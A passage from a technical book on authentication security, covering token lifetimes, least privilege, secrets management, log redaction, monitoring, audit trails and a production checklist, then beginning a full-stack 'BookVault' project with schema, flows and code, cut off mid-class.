> **Common Mistake — the 128-character upper bound is not arbitrary, and it is not a security limit.** It exists because BCrypt/Argon2 hashing a multi-megabyte "password" is a cheap denial-of-service against your login endpoint. Note also **BCrypt silently truncates at 72 bytes** — so with BCrypt, characters past 72 contribute nothing, which surprises users who chose a long passphrase. Argon2id has no such limit.

---

## 14.2 Token lifetimes — concrete numbers

Vague advice ("keep tokens short-lived") is useless without figures. These are defensible defaults; adjust for your risk profile, and be able to justify any change.

| Token | Typical lifetime | Reasoning |
|---|---|---|
| **Access token** | 5–15 min | Bounds a stolen token's usefulness; short enough that revocation lag is tolerable (Ch. 8, section 8.10) |
| **Refresh token** | 7–30 days | Long enough to avoid constant re-login; rotated on every use (Ch. 8, section 8.9) |
| **ID token** | 5–15 min | Consumed once at login; never used as an API credential |
| **Session (idle)** | 15–30 min | Sliding window; banking uses 5–15 |
| **Session (absolute)** | 8–12 hours | Hard cap regardless of activity (Ch. 7, section 7.7) |
| **Password reset token** | **15–60 min**, single-use | Highest-risk token you issue — it can take over an account outright |
| **Email verification token** | 24 hours, single-use | Low risk; users check email slowly |
| **API key** | 90–365 days, rotatable | Machine credential, no human to re-authenticate (Ch. 6) |
| **"Remember me"** | 30 days, device-bound, revocable | Must be individually revocable per device |
| **Service token (client credentials)** | 15–60 min, auto-refreshed | No human waiting; make it short |

> **Remember:** shorter is not automatically better. A 60-second access token means a refresh request roughly every other API call, which hammers your IdP, and every refresh is itself a network round trip that can fail. The right lifetime balances blast radius against operational load. 15 minutes is the industry consensus for a reason.

---

## 14.3 Least privilege

**The principle:** every identity — user, service, token, database account — should hold the minimum permissions needed for its job, and no more.

```
   ❌ WIDE                                ✅ NARROW

   scope: "full_access"                  scope: "orders.read orders.create"
   role:  "admin" (for everyone           role:  "order_processor"
          who needs to see orders)
   DB user: root                          DB user: app_readwrite
                                                    (no DDL, no DROP)
   S3: s3:*                               S3: s3:GetObject on one bucket prefix
   Token aud: "*"                         Token aud: "order-service"
```

**Applying it at each layer:**

- **Users** — RBAC (Chapter 3, section 3.4). Default new accounts to the *lowest* role. Grant elevation deliberately and temporarily.
- **OAuth scopes** — request the minimum (Chapter 9, section 9.11). `photoslibrary.readonly`, not `photoslibrary`.
- **Service accounts** — one identity per service, scoped to what that service calls, never a shared "backend" account.
- **Database** — the application user needs `SELECT/INSERT/UPDATE/DELETE`, not `DROP` or `GRANT`. Migrations run under a *different*, elevated account.
- **Cloud IAM** — resource-scoped policies, not wildcards.

**Just-in-time elevation** — the pattern that makes least privilege workable for humans:

```python
async def request_elevated_access(user_id: str, reason: str, minutes: int = 30):
    """Admin rights that expire on their own. Standing admin access is the
    thing that turns one phished account into a total compromise."""
    if minutes > 120:
        raise ValueError("Elevation is capped at 2 hours")

    grant = ElevationGrant(
        user_id=user_id,
        role="ADMIN",
        reason=reason,                                    # mandatory, and audited
        expires_at=datetime.now(timezone.utc) + timedelta(minutes=minutes),
    )
    await grants.save(grant)
    await audit_log.record("privilege.elevated", user_id=user_id,
                           reason=reason, expires_at=grant.expires_at)
    await notify_security_channel(f"{user_id} elevated to ADMIN: {reason}")
    return grant
```

> **Interview Tip:** asked to describe least privilege, most candidates define it. A stronger answer gives the *failure mode it prevents*: when an account is compromised — and eventually one will be — least privilege is the difference between "the attacker can read one service's order data" and "the attacker has the production database." It is a blast-radius control, not a permissions-tidiness exercise.

---

## 14.4 Secrets management

**The hierarchy, worst to best:**

```
   ❌❌❌  Hardcoded in source          -> in git history forever, even after "removal"
   ❌❌    Config file in the repo       -> same problem, one indirection away
   ❌      .env committed by accident    -> the single most common leak on GitHub
   ⚠️      .env in .gitignore             -> better; still plaintext on disk, no rotation, no audit
   ✅      Environment variables injected  -> acceptable; visible in process dumps and `/proc`
   ✅✅    Secrets manager                 -> Vault, AWS Secrets Manager, GCP Secret Manager
   ✅✅✅  Secrets manager + dynamic,       -> credentials that expire on their own
           short-lived credentials
```

```python
import boto3
from functools import lru_cache

@lru_cache(maxsize=32)
def get_secret(name: str) -> str:
    """Fetch from AWS Secrets Manager, cached in memory.

    Cached because a network call per request is unacceptable — but note
    the trade-off: a rotated secret is not picked up until this process
    restarts or the cache is invalidated. Production code should use a
    TTL cache and handle "secret rotated" as an expected event, not an outage.
    """
    client = boto3.client("secretsmanager")
    return client.get_secret_value(SecretId=name)["SecretString"]

JWT_SIGNING_KEY = get_secret("prod/jwt/signing-key")
```

**Non-negotiables:**

- **Never commit secrets.** Run `gitleaks` or `trufflehog` in CI. Enable your platform's push protection.
- **Assume a committed secret is compromised forever.** Removing it in a later commit does not remove it from history, from forks, or from anyone's local clone. **Rotate it** — that is the only real remediation.
- **Different secrets per environment.** Dev must never be able to sign production tokens.
- **Rotate on a schedule and on staff departure**, using the grace-period pattern from Chapter 6, section 6.4.
- **Never log secrets**, and configure your error reporter's scrubbing *before* enabling it (Chapter 12, section 12.10).

---

## 14.5 Logging — what to log, and what never to

This distinction matters more than the volume of logging.

```
   ✅ ALWAYS LOG                          ❌ NEVER LOG

   Authentication attempts (success/fail)  Passwords (even failed attempts —
   User ID / subject                        especially failed ones, since they
   Source IP and User-Agent                 are often the correct password
   Timestamp (UTC, ISO 8601)                mistyped into the wrong field)
   Event type and outcome                  Full tokens or session IDs
   Token jti (identifier, NOT the token)    Authorization / Cookie headers
   Resource accessed                        API keys
   Authorization decisions (allow/deny)     Full PII beyond what is required
   Privilege changes                        Security question answers
   Password/email changes                   MFA codes
```

```python
import logging, re

REDACT_PATTERNS = [
    (re.compile(r'("password"\s*:\s*)"[^"]*"'), r'\1"[REDACTED]"'),
    (re.compile(r'(Bearer\s+)[A-Za-z0-9._\-]+'), r'\1[REDACTED]'),
    (re.compile(r'("(?:access|refresh|id)_token"\s*:\s*)"[^"]*"'), r'\1"[REDACTED]"'),
    (re.compile(r'(Cookie:\s*)\S+'), r'\1[REDACTED]'),
]

class RedactingFilter(logging.Filter):
    """Defence in depth. The primary control is not logging secrets in the
    first place — but a filter catches the third-party library that dumps
    a full request on error, which you did not write and cannot foresee."""
    def filter(self, record: logging.LogRecord) -> bool:
        msg = record.getMessage()
        for pattern, replacement in REDACT_PATTERNS:
            msg = pattern.sub(replacement, msg)
        record.msg, record.args = msg, ()
        return True

def log_auth_event(event: str, user_id: str | None, ip: str, success: bool, **extra):
    logging.getLogger("security.audit").info(
        "auth_event",
        extra={
            "event": event, "user_id": user_id, "ip": ip,
            "success": success, "timestamp": datetime.now(timezone.utc).isoformat(),
            **extra,
        },
    )
```

> **Common Mistake:** logging failed login attempts *with the attempted password*, reasoning that "it was wrong anyway, so it isn't a real password." It very often is — the user typed their correct password into the wrong account, or with one character off. You have now written real, working credentials into a log file that is backed up, shipped to a third-party aggregator, and readable by anyone with log access. This is a recurring cause of real breaches.

---

## 14.6 Monitoring and alerting

Logs you never look at are storage costs. These are the signals worth an alert:

| Signal | Threshold (starting point) | What it usually means |
|---|---|---|
| Failed logins for one account | > 10 in 5 min | Brute force (Ch. 12, section 12.5) |
| Failed logins across many accounts from one IP/ASN | > 50 in 5 min | **Credential stuffing** |
| Login success rate drop | < 80% of baseline | Stuffing in progress, or you broke login |
| Token validation failures | Sudden spike | Key rotation gone wrong, or forgery attempts |
| Privilege escalation | **Any** occurrence | Alert every time, always |
| New-country login | Any, for admins | Account takeover |
| Impossible travel | Any | Session hijacking (Ch. 12, section 12.10) |
| Password reset requests | > 5/hour for one account | Targeted takeover attempt |
| 403 rate | Spike | Broken deploy, or probing for authorization gaps |
| Refresh-token reuse | **Any** occurrence | **Confirmed token theft** (Ch. 8, section 8.9) |

> **Remember:** refresh-token reuse detection is the single highest-signal alert in this table. Unlike failed logins, it has essentially no benign explanation — a correctly rotating client never presents a used token twice. Treat it as a confirmed incident: revoke the user's whole token family, and notify them.

---

## 14.7 Audit trails

**Term defined:** an audit trail is an *immutable*, *tamper-evident* record of security-relevant events, kept to answer "who did what, when, and from where" long after the fact — for incident response, compliance, and disputes.

**How it differs from ordinary logging:**

| | Application logs | Audit trail |
|---|---|---|
| Purpose | Debugging | Accountability and legal evidence |
| Mutability | Rotated, deleted freely | **Append-only**, tamper-evident |
| Retention | Days to weeks | Months to years (often mandated) |
| Audience | Engineers | Security, compliance, auditors, courts |

```sql
CREATE TABLE audit_log (
    id            BIGSERIAL PRIMARY KEY,
    occurred_at   TIMESTAMPTZ NOT NULL DEFAULT now(),
    actor_id      TEXT,                 -- who did it (NULL for anonymous attempts)
    actor_ip      INET,
    actor_agent   TEXT,
    event_type    TEXT NOT NULL,        -- 'auth.login.success', 'user.role.changed'
    target_type   TEXT,                 -- 'user', 'account', 'api_key'
    target_id     TEXT,
    outcome       TEXT NOT NULL,        -- 'success' | 'failure' | 'denied'
    metadata      JSONB,                -- event-specific detail; NEVER credentials
    -- Hash chain: each row commits to the previous one, so deleting or
    -- editing any row breaks verification for every row after it.
    prev_hash     TEXT,
    row_hash      TEXT NOT NULL
);

-- Enforce append-only at the DATABASE level, not just in application code.
-- Application-level "we never update audit rows" is a convention; this is a rule.
REVOKE UPDATE, DELETE ON audit_log FROM application_user;
CREATE INDEX idx_audit_actor_time ON audit_log (actor_id, occurred_at DESC);
CREATE INDEX idx_audit_event_time ON audit_log (event_type, occurred_at DESC);
```

**Events that must always be audited:**

```
   AUTHENTICATION            AUTHORIZATION           ACCOUNT LIFECYCLE
   - login success/failure    - permission granted    - user created / deleted
   - logout                   - permission revoked    - role changed
   - MFA enrolled/removed     - access denied (403)   - email changed
   - password changed/reset   - elevation requested   - account locked/unlocked
   - token issued/revoked     - elevation used        - API key created/revoked
```

> **Common Mistake:** auditing only successful actions. **Denied** attempts are frequently the more valuable record — a series of 403s from one account is exactly the trail that reveals an attacker probing after a takeover, and it is the first thing an incident responder looks for.

---

## 14.8 The production readiness checklist

Everything in this book, as something you can actually check off before a launch.

**Authentication**
- [ ] HTTPS enforced everywhere; HTTP redirects to HTTPS; HSTS set (12.1)
- [ ] Passwords hashed with Argon2id or BCrypt ≥ 12 (12.2)
- [ ] Breached-password screening at registration and password change (14.1)
- [ ] Constant-time comparison for every secret comparison (5.5)
- [ ] Generic, identical responses **and timings** for all login failures (11.11)
- [ ] Rate limiting per IP **and** per account, with backoff (12.5)
- [ ] MFA available; **required** for administrators
- [ ] New session ID / token issued on every privilege change (7.8, 12.10)

**Tokens**
- [ ] Access tokens ≤ 15 min; refresh tokens rotated on use (8.9, 14.2)
- [ ] Refresh-token reuse detection wired to an alert (8.9, 14.6)
- [ ] Signing algorithm pinned on the verifier — never read from the token (8.7)
- [ ] `iss`, `aud`, `exp` all validated (8.11, 13.6)
- [ ] No sensitive data in JWT payloads (8.3)
- [ ] Signing keys in a secrets manager, rotatable, ≥ 256 bits (8.11, 14.4)

**Authorization**
- [ ] Every endpoint has an explicit rule; default is **deny** (11.5)
- [ ] Resource-level ownership checks, not just role checks — no IDOR (2.3, 3.6)
- [ ] Enforced server-side, never only in the UI (3.7)
- [ ] Re-evaluated per request, not cached from login (3.7)

**Transport & browser**
- [ ] TLS 1.2 minimum; internal hops encrypted too (12.1)
- [ ] Cookies: `HttpOnly`, `Secure`, `SameSite`, correct `Path` (7.5)
- [ ] CSRF protection on, unless genuinely stateless header-based auth (12.6)
- [ ] CORS uses an explicit allowlist — never a reflected origin (12.7)
- [ ] All six security headers present (12.11)

**Operations**
- [ ] No secrets in source control; CI secret scanning enabled (14.4)
- [ ] `Authorization`/`Cookie` redacted in logs and error reporting (12.10, 14.5)
- [ ] Audit trail append-only, with the events from 14.7
- [ ] Alerts configured for the signals in 14.6
- [ ] Clocks synchronized via NTP; validation `leeway` configured (13.10)
- [ ] A documented, rehearsed procedure for revoking a compromised user or key
- [ ] Dependency scanning in CI (your auth library will have a CVE eventually)

---

## Chapter 14 Summary

- **Password policy:** length ≥ 12 and breached-password screening beat composition rules and forced rotation, which actively cause weaker passwords.
- **Token lifetimes** should be concrete and justified: ~15 min access, 7–30 day rotating refresh, 15–60 min single-use password reset.
- **Least privilege** is a blast-radius control. Apply it to users, scopes, service accounts, database users, and cloud IAM; use time-boxed just-in-time elevation instead of standing admin.
- **Secrets** belong in a secrets manager. A secret ever committed to git is compromised permanently — rotation is the only remediation.
- **Log** authentication events, outcomes, and identifiers; **never** log passwords (including failed attempts), tokens, or auth headers.
- **Monitor** for stuffing patterns, privilege escalation, impossible travel, and above all **refresh-token reuse** — the one signal with no benign explanation.
- **Audit trails** are append-only and tamper-evident, enforced at the database level, and must record denied attempts as well as successful ones.
- The checklist in 14.8 is the whole book, made actionable.

---

## Interview Questions — Chapter 14

**Q1. Should users be forced to change passwords every 90 days?**
No — current NIST guidance explicitly advises against it. Forced rotation produces predictable increments (`Summer2024!` → `Summer2025!`), drives reuse across sites, and pushes users to write passwords down. Change passwords on *evidence* of compromise instead, and invest that effort in breached-password screening and MFA, which actually reduce risk.

**Q2. What is the single highest-value control against credential stuffing?**
MFA, followed closely by screening passwords against known-breached lists at registration and change. Neither complexity rules nor per-account lockout help meaningfully: stuffing uses *real* credentials from other breaches and makes only one or two attempts per account, so lockout thresholds never trigger.

**Q3. A secret was committed to git and removed in the next commit. Is it safe?**
No. It remains in the repository's history, in every clone and fork, in CI caches, and possibly in a search index. Removing it from `HEAD` changes nothing. The only remediation is to **rotate the secret**, and then optionally rewrite history — in that order, since rotation is what actually ends the exposure.

**Q4. Why is refresh-token reuse such an important signal?**
Because a correctly rotating client never presents a used refresh token twice — the old one is invalidated the moment it is exchanged. A second presentation therefore means two parties hold the same token: the legitimate user and someone else. Unlike failed logins, it has essentially no benign explanation, so it justifies revoking the user's entire token family immediately.

**Q5. How do audit logs differ from application logs?**
Application logs exist for debugging: mutable, short-retention, engineer-facing. Audit logs exist for accountability: append-only and tamper-evident (enforced by database permissions, not convention), retained for months or years, and used by security, compliance, and potentially in legal proceedings. Audit logs must capture denied attempts as well as successes.

**Q6. What does least privilege actually buy you?**
It bounds the damage of a compromise that has already happened. Since some account eventually will be compromised, the question is what the attacker reaches next — least privilege is the difference between one service's data and the entire production database. Just-in-time, time-boxed elevation makes it workable for humans without leaving standing admin rights lying around.

---

## Hands-On Exercises — Chapter 14

1. Implement the k-anonymity breached-password check from section 14.1. Verify that `password123` is rejected and that a random 20-character string is accepted — then confirm with a network capture that the password never leaves your server.
2. Run `gitleaks detect` against any repository you have write access to. Whatever it finds, write the remediation plan you would follow, in order.
3. Build the redacting log filter from section 14.5, then deliberately log a full request containing an `Authorization: Bearer` header and confirm it is redacted.
4. Create the `audit_log` table from section 14.7 with the hash chain, insert several rows, then try to `UPDATE` one as the application user — confirm the permission denial, and show that the chain would break if you did.
5. Take any authentication system you have built (including this book's mini projects) and score it honestly against the section 14.8 checklist. Write down every unchecked box and why.
6. Configure just-in-time elevation as in section 14.3 and prove that access expires automatically without any manual revocation step.

## Mini Project — Chapter 14

Build an **authentication operations dashboard** on top of an existing project from this book.

Requirements:
- Structured audit logging to the append-only table from section 14.7, covering every event listed there.
- An admin-only `GET /admin/audit` endpoint, filterable by actor, event type, and time range — itself audited when used.
- Automated detection for at least four signals from section 14.6, including refresh-token reuse, with alerts written to a log or webhook.
- Breached-password screening on registration and password change.
- Just-in-time admin elevation with a mandatory reason, a hard time cap, and full auditing.
- A `RUNBOOK.md` documenting, step by step: how to revoke a compromised user's sessions, how to rotate the JWT signing key with zero downtime, and how to respond to a refresh-token reuse alert.

---

## Preparing for Chapter 15

Every concept in this book now has a name, a mechanism, a failure mode, and an operational practice. Chapter 15 assembles all of it into one coherent, production-shaped system: registration, email verification, login, refresh, logout, password reset, Google sign-in, RBAC, and protected APIs — with the database schema, folder structure, sequence diagrams, and API documentation you would actually hand to a team.

---

*End of Chapter 14.*

---

# Chapter 15 — Complete Real-World Project

## 15.0 What we are building

Everything in this book, assembled into one system: **"BookVault"**, a library platform with production-shaped authentication.

| Feature | Chapters it draws on |
|---|---|
| Registration + email verification | 5 (hashing), 12 (Argon2), 14 (password policy) |
| Login → access + refresh tokens | 8 (JWT), 11 (Spring Security) |
| Refresh with rotation + reuse detection | 8.9, 14.6 |
| Logout (single device and all devices) | 7.6, 8.10 |
| Forgot / reset password | 12 (single-use tokens), 14.2 |
| Google Sign-In (OIDC) | 9, 10 |
| Role-based access (MEMBER / LIBRARIAN / ADMIN) | 3, 11.8 |
| Protected book + loan APIs | 3.6 (ownership checks) |
| Audit trail | 14.7 |

This chapter gives you the **schema**, the **structure**, the **flows**, the **critical code**, and the **API contract** — not a copy-pasteable repository, but everything you need to build one and know why each piece is shaped the way it is.

---

## 15.1 Architecture

```
                          ┌──────────────┐
                          │   Client       │
                          │ (SPA / mobile) │
                          └───────┬───────┘
                                  │  HTTPS only
                    ┌─────────────▼──────────────┐
                    │      Spring Boot API          │
                    │                               │
                    │  ┌──────────────────────────┐│
                    │  │ SecurityFilterChain (Ch.11)││
                    │  │  RateLimitFilter           ││
                    │  │  JwtAuthFilter              ││
                    │  │  AuthorizationFilter         ││
                    │  └──────────┬───────────────┘│
                    │             ▼                  │
                    │  Controllers → Services → Repos │
                    └──────┬───────────────┬────────┘
                           │               │
                  ┌────────▼────┐  ┌──────▼───────┐
                  │ PostgreSQL   │  │    Redis      │
                  │ users        │  │ rate limits    │
                  │ refresh_tokens│  │ revoked jti    │
                  │ books, loans  │  │ used refresh   │
                  │ audit_log     │  └──────────────┘
                  └─────────────┘
                           │
              ┌────────────┴────────────┐
              ▼                          ▼
      ┌──────────────┐          ┌──────────────┐
      │ Google OIDC   │          │  Email (SMTP) │
      │ (Ch. 10)      │          │  verify/reset │
      └──────────────┘          └──────────────┘
```

**Why access tokens are stateless but refresh tokens are stored:** access tokens are verified locally on every request — no database round-trip (Chapter 8, section 8.12). Refresh tokens are used rarely, must be individually revocable, and need reuse detection, so they live in PostgreSQL. This is exactly the trade-off argued in Chapter 8, section 8.10, now made concrete.

---

## 15.2 Database schema

```sql
-- ============================================================
--  USERS
-- ============================================================
CREATE TYPE user_role AS ENUM ('MEMBER', 'LIBRARIAN', 'ADMIN');

CREATE TABLE users (
    id                  UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    email               CITEXT UNIQUE NOT NULL,      -- CITEXT: case-insensitive.
                                                      -- Anuj@x.com and anuj@x.com
                                                      -- MUST be one account, or you
                                                      -- have a duplicate-account and
                                                      -- account-takeover problem.
    -- NULLABLE: users who sign in only with Google have no password at all.
    -- A NOT NULL column here forces you to invent a fake password, which is
    -- a real, common source of account-takeover bugs.
    password_hash       TEXT,
    full_name           TEXT NOT NULL,
    role                user_role NOT NULL DEFAULT 'MEMBER',

    email_verified      BOOLEAN NOT NULL DEFAULT FALSE,
    enabled             BOOLEAN NOT NULL DEFAULT TRUE,   -- soft disable, never DELETE

    failed_login_count  INT NOT NULL DEFAULT 0,
    locked_until        TIMESTAMPTZ,

    -- Every token issued before this moment is invalid. One UPDATE logs the
    -- user out of every device without touching a token store — used on
    -- password change and on "log out everywhere" (Ch. 12, section 12.10).
    tokens_valid_from   TIMESTAMPTZ NOT NULL DEFAULT now(),

    created_at          TIMESTAMPTZ NOT NULL DEFAULT now(),
    updated_at          TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- ============================================================
--  FEDERATED IDENTITIES (Google, Ch. 10)
-- ============================================================
CREATE TABLE federated_identities (
    id            UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    user_id       UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    provider      TEXT NOT NULL,               -- 'google'
    provider_sub  TEXT NOT NULL,               -- the OIDC `sub` claim (10.9)
    created_at    TIMESTAMPTZ NOT NULL DEFAULT now(),

    -- Keyed on (provider, sub) and NOT on email, because emails change
    -- and `sub` is specified to be stable (Ch. 10, section 10.9).
    UNIQUE (provider, provider_sub)
);

-- ============================================================
--  REFRESH TOKENS  (Ch. 8.8-8.9)
-- ============================================================
CREATE TABLE refresh_tokens (
    id            UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    user_id       UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,

    -- The HASH, never the raw token — same rule as API keys (Ch. 6, section 6.3).
    -- SHA-256 is correct here: the token is already 256 bits of CSPRNG output,
    -- so there is no weak input for an attacker to brute-force (Ch. 12, 12.2).
    token_hash    TEXT UNIQUE NOT NULL,

    -- Rotation lineage. All tokens descended from one login share a family_id,
    -- so detecting reuse lets us revoke the whole family at once (8.9).
    family_id     UUID NOT NULL,

    issued_at     TIMESTAMPTZ NOT NULL DEFAULT now(),
    expires_at    TIMESTAMPTZ NOT NULL,
    used_at       TIMESTAMPTZ,        -- non-NULL => rotated away; re-presentation
                                       -- of this token is THEFT (14.6)
    revoked_at    TIMESTAMPTZ,

    device_label  TEXT,               -- "Chrome on macOS" — for a sessions UI
    ip_address    INET
);
CREATE INDEX idx_refresh_family ON refresh_tokens (family_id);
CREATE INDEX idx_refresh_user   ON refresh_tokens (user_id) WHERE revoked_at IS NULL;

-- ============================================================
--  ONE-TIME TOKENS  (email verification, password reset)
-- ============================================================
CREATE TYPE ott_purpose AS ENUM ('EMAIL_VERIFICATION', 'PASSWORD_RESET');

CREATE TABLE one_time_tokens (
    id          UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    user_id     UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    token_hash  TEXT UNIQUE NOT NULL,       -- hashed: a leaked DB must not
                                             -- hand out working reset links
    purpose     ott_purpose NOT NULL,
    expires_at  TIMESTAMPTZ NOT NULL,        -- 15-60 min for reset (14.2)
    used_at     TIMESTAMPTZ,                  -- enforces single use
    created_at  TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- ============================================================
--  DOMAIN
-- ============================================================
CREATE TABLE books (
    id                UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    isbn              TEXT UNIQUE NOT NULL,
    title             TEXT NOT NULL,
    author            TEXT NOT NULL,
    total_copies      INT NOT NULL CHECK (total_copies >= 0),
    available_copies  INT NOT NULL CHECK (available_copies >= 0),
    CHECK (available_copies <= total_copies)
);

CREATE TABLE loans (
    id           UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    -- This column IS the authorization boundary: "can this user see this
    -- loan?" reduces to "does user_id match?" (Ch. 3, section 3.6).
    user_id      UUID NOT NULL REFERENCES users(id),
    book_id      UUID NOT NULL REFERENCES books(id),
    borrowed_at  TIMESTAMPTZ NOT NULL DEFAULT now(),
    due_at       TIMESTAMPTZ NOT NULL,
    returned_at  TIMESTAMPTZ
);
CREATE INDEX idx_loans_user ON loans (user_id);

-- ============================================================
--  AUDIT (Ch. 14.7) — append-only
-- ============================================================
CREATE TABLE audit_log (
    id           BIGSERIAL PRIMARY KEY,
    occurred_at  TIMESTAMPTZ NOT NULL DEFAULT now(),
    actor_id     UUID,
    actor_ip     INET,
    event_type   TEXT NOT NULL,
    target_type  TEXT,
    target_id    TEXT,
    outcome      TEXT NOT NULL,
    metadata     JSONB
);
REVOKE UPDATE, DELETE ON audit_log FROM bookvault_app;
```

> **Remember — three schema decisions carry most of the security weight here:** `password_hash` is nullable (so Google-only users are representable without a fake password), `email` is `CITEXT` (so case variants cannot become duplicate accounts), and `tokens_valid_from` exists (so "log out everywhere" is one `UPDATE` rather than a scan of every issued token).

---

## 15.3 Folder structure

```
bookvault/
├── src/main/java/com/bookvault/
│   ├── BookVaultApplication.java
│   │
│   ├── config/
│   │   ├── SecurityConfig.java          ← the filter chain (Ch. 11.5)
│   │   ├── CorsConfig.java               ← explicit allowlist (Ch. 12.7)
│   │   └── RateLimitConfig.java
│   │
│   ├── auth/                              ← everything authentication owns
│   │   ├── controller/
│   │   │   ├── AuthController.java        ← register, login, refresh, logout
│   │   │   ├── PasswordController.java     ← forgot, reset
│   │   │   └── OAuthController.java         ← Google OIDC callback
│   │   ├── service/
│   │   │   ├── AuthService.java
│   │   │   ├── JwtService.java             ← issue/verify (Ch. 8.13)
│   │   │   ├── RefreshTokenService.java     ← rotation + reuse detection
│   │   │   ├── OneTimeTokenService.java
│   │   │   └── GoogleOidcService.java
│   │   ├── filter/
│   │   │   ├── JwtAuthFilter.java
│   │   │   └── RateLimitFilter.java
│   │   ├── dto/                              ← request/response records
│   │   └── exception/
│   │
│   ├── user/          {entity, repository, UserDetailsService}
│   ├── book/          {controller, service, entity, repository}
│   ├── loan/          {controller, service, entity, repository, LoanSecurity}
│   ├── audit/         {AuditService, AuditLog entity}
│   └── common/        {GlobalExceptionHandler, ApiError}
│
├── src/main/resources/
│   ├── application.yml                    ← NO secrets; env var references only
│   └── db/migration/                       ← Flyway V1__init.sql, ...
└── src/test/java/com/bookvault/
    └── auth/  AuthControllerIT.java, JwtServiceTest.java, ...
```

**Why grouped by feature, not by layer:** a `controllers/`, `services/`, `repositories/` split scatters authentication across three directories, so no one can see the whole mechanism at once and a reviewer cannot tell whether a change touches security. Everything security-relevant living under `auth/` means "who can review this?" has an obvious answer.

---

## 15.4 Sequence diagrams

**Registration + email verification**

```
   Client            API              DB           Email
     │                │               │             │
     │ POST /register  │               │             │
     │ {email,pw,name} │               │             │
     │ ───────────────>│               │             │
     │                │ validate pw policy (14.1):    │
     │                │  length, breached-list check   │
     │                │ Argon2id hash (12.2)            │
     │                │ ──── INSERT user ────────────>│
     │                │      (email_verified=false)    │
     │                │                               │
     │                │ generate 32-byte token,        │
     │                │ store SHA-256 HASH, ttl 24h    │
     │                │ ──── INSERT one_time_token ──>│
     │                │                               │
     │                │ ──── send verify link ───────────────>│
     │ 201 Created     │                               │
     │ {"message":     │  NOTE: no tokens issued yet.   │
     │  "check email"} │  Login is blocked until the    │
     │ <───────────────│  address is verified.          │

     │ GET /verify-email?token=<raw>                    │
     │ ───────────────>│                               │
     │                │ hash it, look up, check expiry  │
     │                │ and used_at IS NULL              │
     │                │ ── UPDATE users SET             │
     │                │      email_verified = true ───>│
     │                │ ── UPDATE token SET used_at ──>│
     │ 200 OK          │                               │
     │ <───────────────│                               │
```

**Login → tokens**

```
   Client                     API                        DB
     │  POST /login {email, password}                     │
     │ ────────────────────────>│                          │
     │                          │ rate limit check (12.5)   │
     │                          │ ── SELECT user by email ─>│
     │                          │                          │
     │                          │ ┌─ Argon2 verify ────────┐│
     │                          │ │ ALWAYS run a hash, even ││
     │                          │ │ when the user is absent, ││
     │                          │ │ so timing does not leak  ││
     │                          │ │ existence (11.11)         ││
     │                          │ └─────────────────────────┘│
     │                          │ checks: enabled? verified?  │
     │                          │         not locked?          │
     │                          │                          │
     │                          │ access  = JWT, 15 min, RS256 │
     │                          │ refresh = 32 random bytes,    │
     │                          │           new family_id        │
     │                          │ ── INSERT refresh_tokens ───>│
     │                          │ ── INSERT audit_log ────────>│
     │  200 {access_token, ...}  │                          │
     │  Set-Cookie: refresh_token=...; HttpOnly; Secure;      │
     │              SameSite=Strict; Path=/api/auth/refresh    │
     │ <────────────────────────│                          │
```

> The refresh token goes in an `HttpOnly` cookie **scoped to `Path=/api/auth/refresh`** so it is never attached to ordinary API calls; the access token is returned in the body for the client to hold **in memory**. That is the split pattern from Chapter 12, section 12.9, in practice.

**Refresh with rotation and theft detection**

```
   Client                     API                        DB
     │  POST /api/auth/refresh                             │
     │  Cookie: refresh_token=<raw>                         │
     │ ────────────────────────>│                          │
     │                          │ ── SELECT by token_hash ─>│
     │                          │                          │
     │            ┌─────────────┴──────────────────────────┐
     │            │ NOT FOUND         -> 401                │
     │            │ revoked_at set     -> 401                │
     │            │ expired            -> 401                │
     │            │                                          │
     │            │ used_at IS NOT NULL  ->  ⚠ THEFT (8.9)    │
     │            │   revoke the ENTIRE family_id             │
     │            │   audit 'security.token_reuse_detected'    │
     │            │   alert + email the user                    │
     │            │   -> 401                                     │
     │            │                                          │
     │            │ VALID -> mark used_at = now()             │
     │            │          issue new refresh, SAME family    │
     │            │          issue new access token            │
     │            └─────────────┬──────────────────────────┘
     │  200 {access_token} + new refresh cookie              │
     │ <────────────────────────│                          │
```

**Google Sign-In (OIDC)**

```
   Browser        API                 Google             DB
     │ GET /oauth2/google              │                  │
     │ ────────────>│                  │                  │
     │              │ generate state + PKCE verifier (9.7) │
     │              │ store BOTH in a short-lived HttpOnly  │
     │              │ cookie — NOT a server-global set (9.10)│
     │ 302 to accounts.google.com/...  │                  │
     │ <────────────│                  │                  │
     │ ──────────── user logs in & consents ─────────────>│
     │ 302 /callback?code=...&state=...                    │
     │ ────────────>│                  │                  │
     │              │ verify state matches THIS browser's   │
     │              │ cookie -> else 400 (CSRF, 9.5)         │
     │              │ POST /token (code + code_verifier) ──>│
     │              │ <── {access_token, id_token} ─────────│
     │              │                  │                  │
     │              │ verify id_token (10.3):               │
     │              │   signature via JWKS, iss, aud, exp    │
     │              │   require email_verified == true       │
     │              │                  │                  │
     │              │ find by (provider='google', sub) ────>│
     │              │   found      -> log in                 │
     │              │   not found, email matches an existing │
     │              │     VERIFIED local account -> link it   │
     │              │   otherwise -> create user, verified=true│
     │              │ issue our OWN access+refresh tokens     │
     │ 302 to app + refresh cookie      │                  │
     │ <────────────│                  │                  │
```

> **Common Mistake — the account-linking hole.** Auto-linking a Google login to an existing local account **by email alone** is an account-takeover vector: if an attacker registers a local account with `victim@gmail.com` and never verifies it, then the real victim signs in with Google and gets silently merged into the attacker's account. Link only when the existing local account is *already verified*, and Google reports `email_verified: true`. Otherwise, require the user to log in locally first and link deliberately.

---

## 15.5 Critical implementation — refresh rotation with theft detection

This is the most security-critical service in the project, so it is worth reading in full.

```java
@Service
@Transactional
public class RefreshTokenService {

    private static final Duration REFRESH_TTL = Duration.ofDays(14);

    private final RefreshTokenRepository repository;
    private final AuditService auditService;
    private final SecureRandom random = new SecureRandom();

    /** Issue a new refresh token. `familyId` is null for a fresh login. */
    public IssuedToken issue(User user, UUID familyId, String device, String ip) {
